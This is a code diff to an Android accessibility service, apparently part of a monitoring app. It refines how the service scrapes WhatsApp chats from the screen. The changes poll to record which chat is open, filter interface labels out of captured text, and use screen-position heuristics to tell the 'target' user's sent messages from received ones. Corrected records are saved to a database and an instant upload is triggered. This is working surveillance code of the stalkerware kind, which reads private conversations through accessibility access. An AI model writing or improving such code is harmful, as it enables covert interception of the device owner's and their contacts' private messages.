@@ -554,16 +554,29 @@ class BlockAccessibilityService : AccessibilityService() {
                                     }
                                 } catch (_: Exception) {}
                             }
-                            walkClick(clickedNode)
+                            var rowContainer = clickedNode
+                            var upCount = 0
+                            while (rowContainer?.parent != null && rowContainer.childCount < 2 && upCount < 4) {
+                                rowContainer = rowContainer.parent
+                                upCount++
+                            }
+                            walkClick(rowContainer ?: clickedNode)
                             val titleCand = texts.firstOrNull { 
                                 it.length in 2..60 && !it.contains(":") && !isWhatsAppUiMetadataOrTimestamp(it) &&
                                 !it.equals("send", ignoreCase = true) && !it.equals("type a message", ignoreCase = true) &&
-                                !it.equals("search", ignoreCase = true) && !it.equals("whatsapp group", ignoreCase = true)
+                                !it.equals("search", ignoreCase = true) && !it.equals("whatsapp group", ignoreCase = true) &&
+                                !it.equals("profile photo", ignoreCase = true) && !it.equals("profile picture", ignoreCase = true)
                             }
                             val root = rootInActiveWindow
                             val hasComposerOnScreen = root != null && hasWhatsAppChatComposer(root)
                             if (!hasComposerOnScreen && !titleCand.isNullOrBlank()) {
                                 lastClickedWhatsAppChat = titleCand
+                                pollHandler.postDelayed({
+                                    recordWhatsAppChatIfForeground(rootInActiveWindow)
+                                }, 300L)
+                                pollHandler.postDelayed({
+                                    recordWhatsAppChatIfForeground(rootInActiveWindow)
+                                }, 1000L)
                             }
                         }
                     }
@@ -959,7 +972,9 @@ class BlockAccessibilityService : AccessibilityService() {
             "Settings", "Search", "Archived", "Unread", "Groups", "All",
             "Online", "Typing...", "Typing", "Audio call", "Video call", "Call",
             "More options", "Back", "Navigate up", "Camera", "Attach", "Send",
-            "Disappearing messages"
+            "Disappearing messages", "Profile photo", "Profile picture", "View contact",
+            "Group info", "Custom", "Status", "Emoji", "Sticker", "GIF", "Gallery",
+            "Audio", "Location", "Contact", "Poll", "Document"
         )
         try {
             val candidateIds = listOf(
@@ -977,8 +992,8 @@ class BlockAccessibilityService : AccessibilityService() {
                     val nodes = root.findAccessibilityNodeInfosByViewId(id)
                     if (!nodes.isNullOrEmpty()) {
                         for (node in nodes) {
-                            val t = (node.text ?: node.contentDescription)?.toString()?.trim()
-                            if (!t.isNullOrBlank() && !reservedTitles.contains(t) && !isWhatsAppUiMetadataOrTimestamp(t)) {
+                            val t = (node.text?.toString() ?: "").trim()
+                            if (t.isNotBlank() && !reservedTitles.any { res -> res.equals(t, ignoreCase = true) } && !isWhatsAppUiMetadataOrTimestamp(t)) {
                                 val clean = t.replace("\\s+".toRegex(), " ").trim()
                                 if (clean.length in 2..60) {
                                     lastClickedWhatsAppChat = clean
@@ -997,8 +1012,8 @@ class BlockAccessibilityService : AccessibilityService() {
                     val rect = Rect()
                     node.getBoundsInScreen(rect)
                     if (rect.top < 450 && rect.bottom > 20) {
-                        val t = (node.text ?: node.contentDescription)?.toString()?.trim()
-                        if (!t.isNullOrBlank() && !reservedTitles.any { res -> res.equals(t, ignoreCase = true) } &&
+                        val t = (node.text?.toString() ?: "").trim()
+                        if (t.isNotBlank() && !reservedTitles.any { res -> res.equals(t, ignoreCase = true) } &&
                             !t.startsWith("last seen", ignoreCase = true) &&
                             !t.startsWith("online", ignoreCase = true) &&
                             !t.startsWith("typing", ignoreCase = true) &&
@@ -1557,20 +1572,30 @@ class BlockAccessibilityService : AccessibilityService() {
                 val lastSentTime = recentSentWhatsAppTexts[normalizedText]
                 val isRecentlySentByTarget = lastSentTime != null && (now - lastSentTime) < 120_000L
 
-                // Outgoing detection:
-                // 1. Text was recently sent from composer on this device
-                // 2. Bubble container has delivery receipt icon (Delivered, Read, Sent, Pending)
-                // 3. Message text starts with "You: "
-                // 4. Content description has receipt text
-                // 5. Bubble or text node is anchored to the right side of the screen
-                // 6. Node center is significantly right of screen center
-                val isOutgoing = isRecentlySentByTarget ||
-                                 hasStatusIcon ||
-                                 extractedMsg.startsWith("You: ", ignoreCase = true) ||
-                                 (cd != null && (cd.contains("Delivered", ignoreCase = true) || cd.contains("Read", ignoreCase = true) || cd.contains("Sent", ignoreCase = true))) ||
-                                 (parentRect.right >= (screenWidth * 0.80f) && parentRect.left > (screenWidth * 0.14f)) ||
-                                 (rect.right >= (screenWidth * 0.75f) && rect.left > (screenWidth * 0.14f)) ||
-                                 rect.centerX() > (screenWidth * 0.52f)
+                // Outgoing vs Incoming distinction:
+                // Outgoing bubbles on WhatsApp:
+                // - Pinned to the right side of the screen
+                // - Have status checkmark/receipt icons (Delivered, Read, Sent, Pending)
+                // - Typed recently in composer on this device
+                // - Text starts with "You: "
+                //
+                // Incoming bubbles on WhatsApp:
+                // - Pinned to the left side of the screen (left margin < 15% screen width)
+                // - Never have status checkmark icons
+                // - Never start with "You: "
+                val isRightAligned = (parentRect.right >= (screenWidth * 0.82f) && parentRect.left > (screenWidth * 0.16f)) ||
+                                     (rect.right >= (screenWidth * 0.78f) && rect.left > (screenWidth * 0.22f))
+                val isLeftAligned = (parentRect.left <= (screenWidth * 0.14f)) || (rect.left <= (screenWidth * 0.18f))
+
+                val isOutgoing = when {
+                    isRecentlySentByTarget -> true
+                    hasStatusIcon -> true
+                    extractedMsg.startsWith("You: ", ignoreCase = true) -> true
+                    cd != null && (cd.contains("Delivered", ignoreCase = true) || cd.contains("Read", ignoreCase = true) || cd.contains("Sent", ignoreCase = true)) -> true
+                    isRightAligned && !isLeftAligned -> true
+                    isLeftAligned -> false
+                    else -> rect.centerX() > (screenWidth * 0.62f) && rect.left > (screenWidth * 0.22f)
+                }
 
                 val reelUrl = findReelUrlNearby(node) ?: extractReelUrl(cleanText) ?: extractReelUrl(cd)
                 val isReel = reelUrl != null ||
@@ -1650,11 +1675,13 @@ class BlockAccessibilityService : AccessibilityService() {
                             )
                             if (existingDirection == null) {
                                 filteredEntries.add(entry)
-                            } else if (existingDirection == false && entry.isOutgoing) {
-                                db.whatsAppMessageDao().updateToOutgoing(
+                            } else if (existingDirection != entry.isOutgoing) {
+                                db.whatsAppMessageDao().updateMessageDirection(
                                     entry.chatName,
                                     entry.messageText,
-                                    entry.messageTimeEpochMs - 30_000L
+                                    entry.isOutgoing,
+                                    entry.sender,
+                                    entry.messageTimeEpochMs - 60_000L
                                 )
                                 com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
                             }
